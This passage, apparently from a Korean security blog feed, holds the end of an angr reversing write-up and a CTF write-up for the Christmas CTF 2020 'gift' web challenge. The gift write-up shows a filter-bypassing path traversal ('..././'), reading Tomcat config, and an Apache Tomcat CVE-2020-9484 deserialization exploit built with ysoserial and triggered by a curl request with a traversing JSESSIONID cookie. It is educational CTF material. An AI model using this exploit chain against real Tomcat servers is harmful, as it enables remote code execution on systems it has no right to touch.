class="hljs-number">400000</span>.<span class="hljs-attribute">WARNING</span> | <span class="hljs-number">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">28</span> <span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">45</span>,<span class="hljs-number">089</span> | angr.simos.simos | stdin is constrained to <span class="hljs-number">57</span> bytes (has_end=True).<span class="hljs-attribute">If</span> you are only providing the first <span class="hljs-number">57</span> bytes instead of the entire stdin,<span class="hljs-attribute">please</span> use stdin=SimFileStream(name=&apos;stdin&apos;, content=your_first_n_bytes, has_end=False).<span class="hljs-attribute">b</span>&apos;XMAS{h<span class="hljs-number">3</span>_<span class="hljs-number">1</span>s_b<span class="hljs-number">1</span>o<span class="hljs-number">0</span>d<span class="hljs-number">3</span>lf_d<span class="hljs-number">3</span>athkni<span class="hljs-number">9</span>ht_wh<span class="hljs-number">0</span>_will_kill_<span class="hljs-number">4</span>ngrf<span class="hljs-number">0</span>rge}\n&apos;</code></pre><p>Flag : XMAS{h3_1s_b1o0d3lf_d3athkni9ht_wh0_will_kill_4ngrf0rge}</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
      <tag>angr</tag>
      
      <tag>christmas ctf 2020</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - gift</title>
    <link href="/2020/12/29/idioth/christmasctf2020-gift/"/>
    <url>/2020/12/29/idioth/christmasctf2020-gift/</url>
    
    <content type="html"><![CDATA[<h1 id="&#xCD9C;&#xC81C;-&#xC758;&#xB3C4;"><a href="#&#xCD9C;&#xC81C;-&#xC758;&#xB3C4;" class="headerlink" title="&#xCD9C;&#xC81C; &#xC758;&#xB3C4;"></a>&#xCD9C;&#xC81C; &#xC758;&#xB3C4;</h1><p>&#xC62C;&#xD574; &#xCD08;&#xC5D0; &#xBC1C;&#xD45C;&#xB41C; Apache Tomcat CVE-2020-9484&#xB97C; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xBB38;&#xC81C;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xBCF4;&#xACE0; &#xC2F6;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C;&#xB97C; &#xB9CC;&#xB4E4;&#xBA74;&#xC11C; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xB294; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xB9CC;&#xB4E4;&#xACE0; &#xC2F6;&#xC740;&#xB370;&#x2026; &#xB9CC;&#xC57D; &#xC774;&#xB7F0; &#xC0AC;&#xC774;&#xD2B8;&#xAC00; &#xC788;&#xC5C8;&#xB2E4;&#xBA74; &#xC5B4;&#xB5A4; &#xC2DD;&#xC73C;&#xB85C; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC744;&#xAE4C;?&#xB77C;&#xB294; &#xC0DD;&#xAC01;&#xC744; &#xD558;&#xBA74;&#xC11C; &#xB9CC;&#xB4E4;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>session&#xC774; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xC704;&#xCE58;&#xC640; &#xC790;&#xC2E0;&#xC774; &#xC62C;&#xB9B0; &#xD30C;&#xC77C;&#xC774; &#xC5C5;&#xB85C;&#xB4DC;&#xB418;&#xB294; &#xC704;&#xCE58;&#xB97C; &#xBAA8;&#xB450; &#xC54C;&#xC544;&#xC57C; &#xD558;&#xACE0; &#xB610; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC774;&#xB77C;&#xB294; &#xAC83;&#xB3C4; &#xC54C;&#xC544;&#xC57C; &#xD574;&#xC11C; local&#xC5D0; &#xC788;&#xB294; &#xD30C;&#xC77C;&#xC744; &#xBAA8;&#xB450; &#xBCFC; &#xC218; &#xC788;&#xC73C;&#xBA74; &#xB418;&#xACA0;&#xB2E4;&#xB294; &#xC0DD;&#xAC01;&#xC744; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. <del>lock&#xACFC; angrforge&#xC758; &#xD5C8;&#xC220;&#xD568;&#xC740; &#xC5EC;&#xAE30;&#xC5D0;&#xC11C; &#xC654;&#xB2E4;.</del></p><p>RCE&#xB97C; &#xD65C;&#xC6A9;&#xD574;&#xC57C; &#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xACFC; &#xC2E4;&#xD589;&#xD560; &#xD30C;&#xC77C;&#xC758; &#xC704;&#xCE58;&#xB97C; <code>special.jsp</code>&#xC5D0; &#xB123;&#xC5B4;&#xB1A8;&#xB294;&#xB370; &#xC880; &#xB354; &#xC798; &#xBCF4;&#xC774;&#xB294; &#xACF3;&#xC5D0; &#xB123;&#xC5B4;&#xB458; &#xAC78;&#x2026; &#xD558;&#xB294; &#xC0DD;&#xAC01;&#xC744; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image.jpg" alt></p><p>&#xC81C;&#xAC00; &#xC6F9; &#xC54C;&#xBABB;&#xC774;&#xB2E4; &#xBCF4;&#xB2C8; &#xC774;&#xB7F0;&#xC800;&#xB7F0; &#xAC83;&#xC744; &#xAD6C;&#xD604;&#xD560; &#xB54C; &#xC8FC;&#xC704;&#xC758; &#xC6F9; &#xD558;&#xB294; &#xCE5C;&#xAD6C;&#xB4E4;&#xD55C;&#xD14C; &#xBB3C;&#xC5B4;&#xBCF4;&#xBA70; &#xC774;&#xAC70; &#xC774;&#xB7EC;&#xC774;&#xB7EC;&#xD558;&#xAC8C; &#xD574;&#xC11C; &#xD50C;&#xB798;&#xADF8;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB294; &#xAC74;&#xB370; &#xAC8C;&#xC2F1;&#xC774; &#xC2EC;&#xD558;&#xC9C0; &#xC54A;&#xC744;&#xAE4C;? &#xC0AC;&#xB78C;&#xB4E4;&#xC774; &#xC774;&#xB7F0; &#xC2DD;&#xC73C;&#xB85C; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC744;&#xAE4C;? &#xB0B4;&#xAC00; &#xC774;&#xAC70; &#xC5B4;&#xB5BB;&#xAC8C; &#xD558;&#xB294;&#xC9C0; &#xC798; &#xBAB0;&#xB77C;&#xC11C; &#xC774;&#xB807;&#xAC8C; &#xD574;&#xBD24;&#xB294;&#xB370; &#xAD1C;&#xCC2E;&#xC744;&#xAE4C;? &#xBB3C;&#xC5B4;&#xBCF4;&#xBA74;&#xC11C; &#xB9CC;&#xB4E4;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. <del>&#xC77C;&#xB2E8; &#xC788;&#xB294; &#xAC70; &#xB2E4; &#xD574;&#xBCF4;&#xACE0; &#xD30C;&#xC77C;&#xC740; &#xB2E4; &#xCC3E;&#xC544;&#xBCF8;&#xB2E4;&#xBA70;</del></p><p>&#xAD6C;&#xD604;&#xC744; &#xB3C4;&#xC640;&#xC900;&#xB2E4;&#xB358; &#xB188;&#xB4E4;&#xC740; jsp&#xB77C;&#xACE0; &#xD558;&#xB2C8;&#xAE4C; &#xB2E4; &#xB3C4;&#xB9DD;&#xAC00;&#xB354;&#xAD70;&#xC694; &#xD558;&#xD558;&#xD558;&#x2026; &#xC7A1;&#xC124;&#xC774; &#xAE38;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image0.png" alt></p><p>&#xBA54;&#xC778; &#xD654;&#xBA74;&#xC785;&#xB2C8;&#xB2E4;. &#xC800;&#xAE30; &#xAE43;&#xBC1C;(flag) &#xBAA8;&#xC591;&#xC5D0; Special gift&#xAC00; &#xC228;&#xACA8;&#xC838; &#xC788;&#xB2E4;!&#xB77C;&#xACE0; &#xB418;&#xC5B4;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xAC78; description&#xC5D0; &#xC801;&#xC5B4;&#xB1A8;&#xC73C;&#xBA74; &#xCC38; &#xC88B;&#xC558;&#xC744;&#xAC78; &#xC65C; &#xC548; &#xC801;&#xC5B4;&#xB1A8;&#xC9C0;? &#xC77C;&#xB2E8; &#xB85C;&#xADF8;&#xC778;&#xC744; &#xD574;&#xC57C; &#xAE30;&#xB2A5;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xB294; &#xAC83; &#xAC19;&#xC73C;&#xB2C8; &#xB85C;&#xADF8;&#xC778;&#xC744; &#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image1.png" alt></p><p>&#xB85C;&#xADF8;&#xC778;&#xC744; &#xD558;&#xBA74; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC774;&#xD2B8;&#xC5D0;&#xC11C; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xC815;&#xB9AC;&#xD558;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><code>Gift List</code><ul><li>&#xC804;&#xC1A1;&#xD55C; &#xC120;&#xBB3C;&#xC758; &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xBCFC; &#xC218; &#xC788;&#xB2E4;.</li><li>file name&#xC744; <code>GET</code>&#xC744; &#xD1B5;&#xD574; &#xBC1B;&#xB294;&#xB2E4;.</li></ul></li><li><code>Send List</code><ul><li>&#xC120;&#xBB3C;&#xC744; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xB2E4;.</li></ul></li><li><code>Community</code><ul><li>&#xAC8C;&#xC2DC;&#xD310; &#xAE30;&#xB2A5;&#xC73C;&#xB85C; &#xAE00;&#xC744; &#xC791;&#xC131;&#xD560; &#xC218; &#xC788;&#xB2E4;.</li></ul></li></ul><p>&#xC120;&#xBB3C;&#xC744; &#xC804;&#xC1A1;&#xD558;&#xBA74; &#xC0B0;&#xD0C0;&#xAC00; &#xADF8; &#xC120;&#xBB3C;&#xC744; &#xC900;&#xB2E4;&#xACE0; &#xD558;&#xACE0; gift list&#xC5D0;&#xC11C; &#xC62C;&#xB9B0; &#xC120;&#xBB3C; &#xB9AC;&#xC2A4;&#xD2B8;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC73C;&#xB2C8; &#xC77C;&#xB2E8; <code>Send List</code>&#xB97C; &#xD1B5;&#xD574; &#xC120;&#xBB3C;&#xC744; &#xC804;&#xC1A1;&#xD558;&#xACE0; &#xB09C; &#xD6C4; <code>Gift List</code>&#xC5D0;&#xC11C; &#xC5B4;&#xB5A0;&#xD55C; &#xC2DD;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294;&#xC9C0;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image2.png" alt></p><p>txt &#xD30C;&#xC77C;&#xACFC; &#xC790;&#xC2E0;&#xB4E4;&#xC758; secret&#xD55C; &#xD30C;&#xC77C;&#xB9CC; &#xC62C;&#xB9B4; &#xC218; &#xC788;&#xB2E4;&#xACE0; &#xD558;&#xB2C8; &#xC77C;&#xB2E8; txt &#xD30C;&#xC77C;&#xC744; &#xC62C;&#xB824;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image3.png" alt></p><p>&#xC804;&#xC1A1;&#xC774; &#xC644;&#xB8CC;&#xB41C; &#xD6C4; <code>Gift List</code>&#xB97C; &#xD1B5;&#xD574; &#xD30C;&#xC77C; &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA74; <code>&lt;name&gt;</code>&#x2018;s gift list&#xB77C;&#xB294; &#xC81C;&#xBAA9;&#xACFC; &#xD568;&#xAED8; &#xC5C5;&#xB85C;&#xB4DC;&#xD55C; &#xD30C;&#xC77C;&#xC774; &#xD45C;&#xC2DC;&#xAC00; &#xB418;&#xACE0; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image4.png" alt></p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image5.png" alt></p><p>gift list&#xB97C; &#xBD88;&#xB7EC;&#xC62C; &#xB54C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <code>&lt;name&gt;</code>&#xC740; <code>GET</code>&#xC744; &#xD1B5;&#xD574; &#xBD88;&#xB7EC;&#xC624;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xCD94;&#xC815;&#xB418;&#xBBC0;&#xB85C; &#xD574;&#xB2F9; &#xC778;&#xC790; &#xAC12;&#xC744; &#xC218;&#xC815;&#xD574;&#xBD05;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image6.png" alt></p><p>name&#xC744; &#xBCC0;&#xACBD;&#xD558;&#xC790; testa&#x2019;s gift list&#xB97C; &#xC77D;&#xC5B4;&#xC624;&#xACE0; &#xC544;&#xBB34;&#xAC83;&#xB3C4; &#xCD9C;&#xB825;&#xC774; &#xC548; &#xB418;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>name&#xC5D0; &#xB530;&#xB77C; &#xB2E4;&#xB978; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xD574;&#xB2F9; &#xD3F4;&#xB354;&#xC5D0; &#xD30C;&#xC77C;&#xC774; &#xC62C;&#xB77C;&#xAC04;&#xB2E4;&#xB294; &#xAC00;&#xC124;&#xC744; &#xC138;&#xC6B0;&#xACE0; path traversal&#xC774; &#xAC00;&#xB2A5;&#xD55C;&#xC9C0; &#xD655;&#xC778;&#xC744; &#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image7.png" alt></p><p>name&#xC5D0; <code>.</code>&#xC744; &#xC785;&#xB825;&#xD558;&#xC790; &#xC544;&#xAE4C; &#xC704;&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD55C; &#xB450; &#xAC1C;&#xC758; &#xD3F4;&#xB354;&#xAC00; &#xB098;&#xC635;&#xB2C8;&#xB2E4;. &#xB354; &#xC704;&#xB85C; &#xC62C;&#xB77C;&#xAC00; &#xBD05;&#xC2DC;&#xB2E4;.</p><p><code>../</code>&#xB098; <code>....//</code>&#xC740; &#xD544;&#xD130;&#xB9C1;&#xC774; &#xB418;&#xC5B4; &#xC788;&#xC5B4; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xB9AC;&#xC2A4;&#xD305;&#xC774; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xC9C0;&#xB9CC; <code>..././</code>&#xC740; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image8.png" alt></p><p>&#xD574;&#xB2F9; &#xD3F4;&#xB354;&#xC5D0; &#xC9C4;&#xC785;&#xD558;&#xBA74; gift &#xD3F4;&#xB354; &#xC548;&#xC5D0;&#xC11C; username&#xC73C;&#xB85C; gift list&#xAC00; &#xAD00;&#xB9AC;&#xB418;&#xACE0; &#xC788;&#xC74C;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image9.png" alt></p><p>&#xD55C; &#xBC88; &#xB354; &#xC62C;&#xB77C;&#xAC00;&#xBA74; &#xC774;&#xB7EC;&#xD55C; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xAC00; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;. tomcat&#xC758; &#xC0C1;&#xC704; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC778;&#xB370; &#xC774;&#xB97C; &#xD1B5;&#xD574; tomcat&#xC744; &#xD1B5;&#xD574; &#xAD6C;&#xB3D9;&#xB418;&#xACE0; &#xC788;&#xC74C;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800; &#xC6F9;&#xD398;&#xC774;&#xC9C0; &#xC18C;&#xC2A4;&#xCF54;&#xB4DC; &#xD30C;&#xC77C;&#xC740; webapps&#xC5D0; &#xB4E4;&#xC5B4;&#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xD574;&#xB2F9; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xB4E4;&#xC5B4;&#xAC00;&#xC11C; &#xC5B4;&#xB5A0;&#xD55C; &#xD30C;&#xC77C;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image10.png" alt></p><p><code>special.jsp</code>&#xB77C;&#xB294; &#xD30C;&#xC77C;&#xC774; &#xC788;&#xB124;&#xC694;. &#xBA54;&#xC778;&#xC5D0;&#xC11C; special gift&#xAC00; &#xC228;&#xACA8;&#xC838; &#xC788;&#xB2E4;&#xACE0; &#xD588;&#xC73C;&#xB2C8; &#xD574;&#xB2F9; jsp&#xB97C; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image11.png" alt></p><p><code>special_gift</code> &#xD30C;&#xC77C;&#xC744; &#xCC3E;&#xC544;&#xC11C; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xC774; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0;&#xC11C; &#xD2B9;&#xBCC4;&#xD55C; &#xC120;&#xBB3C;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p>tomcat &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB85C; &#xAC00;&#xC11C; RELEASE-NOTES&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image12.png" alt></p><p>tomcat-8.5.54 &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xB3D9;&#xC791;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xBC84;&#xC804;&#xC740; CVE-2020-9484 &#xBC84;&#xC804;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xB294; &#xBC84;&#xC804;&#xC774;&#xACE0; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>tomcat&#xC774; session&#xC744; PersistenceManager&#xB97C; &#xD1B5;&#xD574; &#xC138;&#xC158;&#xC744; &#xAD00;&#xB9AC;&#xD568;</li><li>FileStore&#xB97C; &#xD1B5;&#xD574; Directory &#xACBD;&#xB85C;&#xB97C; &#xC9C0;&#xC815;&#xD568;</li><li>arbitrary file upload&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xBA70; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC774; &#xC5B4;&#xB514;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xB294;&#xC9C0; &#xC54C; &#xC218; &#xC788;&#xC74C;</li></ul><p>&#xD604;&#xC7AC; arbitrary file upload&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xBA70; &#xD30C;&#xC77C;&#xC774; &#xC5C5;&#xB85C;&#xB4DC;&#xB418;&#xB294; &#xC704;&#xCE58;&#xB3C4; &#xC54C; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; <code>conf/context.xml</code>&#xC744; &#xD1B5;&#xD574; PersistenceManager&#xB97C; &#xC0AC;&#xC6A9; &#xC911;&#xC778;&#xC9C0;, &#xC0AC;&#xC6A9; &#xC911;&#xC774;&#xB77C;&#xBA74; FileStore&#xB85C; Directory&#xB97C; &#xC9C0;&#xC815;&#xD574;&#xC11C; &#xC800;&#xC7A5;&#xD558;&#xB294;&#xC9C0;, &#xC800;&#xC7A5;&#xD55C;&#xB2E4;&#xBA74; session&#xC774; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xACBD;&#xB85C;&#xB294; &#xC5B4;&#xB518;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xC2DC;&#xB2E4;.(&#xC544;&#xAE4C; &#xC704;&#xC5D0;&#xC11C; sessions &#xD3F4;&#xB354;&#xB97C; &#xBCF8; &#xAC83; &#xAC19;&#xAE34; &#xD55C;&#xB370;)</p><p><code>detail.jsp?file=..././..././..././conf/context.xml</code>&#xB85C; &#xC811;&#xADFC;&#xD558;&#xBA74; <code>conf/context.xml</code>&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image13.png" alt></p><p>PersistentManager, FileStore&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA70; session&#xC774; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xACBD;&#xB85C;&#xB294; <code>/usr/local/tomcat/sessions</code>&#xB124;&#xC694;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; session&#xC744; deserialize &#xD558;&#xBA74;&#xC11C; &#xC77C;&#xC5B4;&#xB098;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xBBC0;&#xB85C; gadget&#xB3C4; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image14.png" alt></p><p><code>/lib</code> &#xD3F4;&#xB354;&#xC5D0; <code>groovy-2.3.9.jar</code> &#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC81C; <code>special_gift</code> &#xD30C;&#xC77C;&#xC758; &#xC704;&#xCE58;&#xB97C; &#xCC3E;&#xC544;&#xBCF4;&#xBA74;</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image15.png" alt></p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image16.png" alt></p><p>&#xCD5C;&#xC0C1;&#xC704; &#xACBD;&#xB85C;&#xC5D0; &#xC788;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.(&#xC774;&#xAC83;&#xB3C4; &#xC704;&#xCE58;&#xB97C; &#xC54C;&#xB824;&#xC92C;&#xC5B4;&#xC57C;&#x2026;&#x3160;&#x3160;) &#xC774;&#xC81C; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xC5EC; <code>special_gift</code> &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; <code>/webapps/ROOT</code> &#xC5D0; flag &#xD30C;&#xC77C;&#xC774; &#xC0DD;&#xC131;&#xB420; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xC804;&#xC5D0; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC774; &#xB9DE;&#xB294;&#xC9C0; upload.jsp&#xC758; &#xB0B4;&#xC6A9;&#xC73C;&#xB85C; &#xC62C;&#xB9B4; &#xC218; &#xC788;&#xB294; special file&#xC774; session &#xD30C;&#xC77C;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image17.png" alt></p><p>&#xD5C8;&#xC6A9;&#xB418;&#xC5B4;&#xC788;&#xB294; &#xD655;&#xC7A5;&#xC790;&#xAC00; <code>.txt</code>&#xC640; <code>.session</code>&#xD30C;&#xC77C;&#xC784;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image18.png" alt></p><p>&#xD760;.. &#xC77C;&#xB2E8; exploit &#xACFC;&#xC815;&#xC744; &#xC815;&#xB9AC;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>file&#xC774; &#xC5C5;&#xB85C;&#xB4DC;&#xB418;&#xB294; &#xACBD;&#xB85C;&#xB294; <code>tomcat/media/gift/&lt;name&gt;</code>&#xC774;&#xB2E4;.</li><li>sessions&#xC774; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xACBD;&#xB85C;&#xB294; <code>tomcat/sessions</code>&#xC774;&#xB2E4;.</li><li><code>special.jsp</code> &#xC5D0; &#xB530;&#xB974;&#xBA74; <code>/special_gift</code>&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; flag &#xD30C;&#xC77C;&#xC774; &#xC0DD;&#xC131;&#xB41C;&#xB2E4;.</li><li><code>/bin/bash -c /special_gift</code>&#xB97C; &#xC218;&#xD589;&#xD558;&#xBA74; <code>special_gift</code> &#xD30C;&#xC77C;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xACE0; flag&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB2E4;.</li><li>serialize session &#xC0DD;&#xC131;</li></ul><pre><code class="hljs pgsql">idioth@ubuntu:~$ java -jar ysoserial.jar Groovy1 &quot;/bin/bash -c /special_gift&quot; &gt; exploit.<span class="hljs-keyword">session</span><span class="hljs-built_in">WARNING</span>: An illegal reflective <span class="hljs-keyword">access</span> operation has occurred<span class="hljs-built_in">WARNING</span>: Illegal reflective <span class="hljs-keyword">access</span> <span class="hljs-keyword">by</span> org.codehaus.groovy.reflection.CachedClass<span class="hljs-meta">$3</span><span class="hljs-meta">$1</span> (file:/home/idioth/ysoserial.jar) <span class="hljs-keyword">to</span> <span class="hljs-keyword">method</span> java.lang.<span class="hljs-keyword">Object</span>.finalize()<span class="hljs-built_in">WARNING</span>: Please consider reporting this <span class="hljs-keyword">to</span> the maintainers <span class="hljs-keyword">of</span> org.codehaus.groovy.reflection.CachedClass<span class="hljs-meta">$3</span><span class="hljs-meta">$1</span><span class="hljs-built_in">WARNING</span>: Use <span class="hljs-comment">--illegal-access=warn to enable warnings of further illegal reflective access operations</span><span class="hljs-built_in">WARNING</span>: <span class="hljs-keyword">All</span> illegal <span class="hljs-keyword">access</span> operations will be denied <span class="hljs-keyword">in</span> a future <span class="hljs-keyword">release</span></code></pre><ul><li>&#xD574;&#xB2F9; session file&#xC73C;&#xB85C; &#xC811;&#xADFC;</li></ul><pre><code class="hljs xml">idioth@ubuntu:~$ curl &apos;http://192.168.48.128/index.jsp&apos; -H &apos;Cookie:JSESSIONID=../media/gift/test/exploit&apos;<span class="hljs-meta">&lt;!doctype <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>HTTP Status 500 &#x2013; Internal Server Error<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><span class="css"><span class="hljs-selector-tag">body</span> {<span class="hljs-attribute">font-family</span>:Tahoma,Arial,sans-serif;} <span class="hljs-selector-tag">h1</span>, <span class="hljs-selector-tag">h2</span>, <span class="hljs-selector-tag">h3</span>, <span class="hljs-selector-tag">b</span> {<span class="hljs-attribute">color</span>:white;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#525D76</span>;} <span class="hljs-selector-tag">h1</span> {<span class="hljs-attribute">font-size</span>:<span class="hljs-number">22px</span>;} <span class="hljs-selector-tag">h2</span> {<span class="hljs-attribute">font-size</span>:<span class="hljs-number">16px</span>;} <span class="hljs-selector-tag">h3</span> {<span class="hljs-attribute">font-size</span>:<span class="hljs-number">14px</span>;} <span class="hljs-selector-tag">p</span> {<span class="hljs-attribute">font-size</span>:<span 